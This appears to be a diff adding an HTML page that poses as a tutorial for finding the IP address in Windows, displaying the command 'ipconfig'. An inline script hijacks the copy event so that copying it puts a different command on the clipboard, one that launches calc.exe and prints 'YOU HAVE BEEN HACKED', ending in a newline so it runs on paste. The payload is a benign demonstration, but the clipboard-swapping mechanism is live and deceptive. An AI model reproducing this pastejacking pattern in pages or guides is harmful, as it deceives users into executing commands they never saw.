@@ -1,0 +1,36 @@
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 20px;
+        color: #333;
+        background-color: black;
+    }
+    .instruction {
+        font-size: 1.2em;
+        margin-bottom: 10px;
+    }
+    .code-container {
+        background-color: #f7f7f7;
+        border: 1px solid #ddd;
+        border-left: 4px solid #5b9bd5;
+        padding: 15px;
+        font-family: 'Courier New', Courier, monospace;
+        color: #c7254e;
+        overflow-x: auto;
+    }
+    code {
+        font-size: 1.1em;
+        white-space: pre;
+    }
+</style>
+</head>
+<body>
+<div class="instruction">How to get the IP Address in Windows:</div>
+<div class="code-container">
+    <code><p id='copy'>ipconfig</p></code>
+    <script>
+        document.getElementById('copy').addEventListener('copy', function(e) {
+            e.clipboardData.setData('text/plain',"cmd.exe /c calc.exe & for /l %x in (1, 1, 5) do echo YOU HAVE BEEN HACKED \r\n");
+            e.preventDefault();});
+    </script>
+</div>
